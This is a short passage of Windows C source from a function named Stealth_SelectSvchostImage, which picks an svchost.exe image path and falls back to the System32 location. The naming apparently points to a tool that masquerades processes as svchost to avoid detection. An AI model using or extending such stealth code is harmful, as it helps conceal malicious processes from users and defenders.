            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }

    // Fallback to the standard System32 path (may fail if truly missing)
    lstrcpynW(exePathOut, L"%SystemRoot%\\System32\\svchost.exe", (int)exePathOutLen);
    Stealth_DebugPrintfW(L"Stealth_SelectSvchostImage fallback to %%SystemRoot%%\\System32\\svchost.exe");
    if (useExpand != NULL) { *useExpand = TRUE; }
    return FALSE;
}
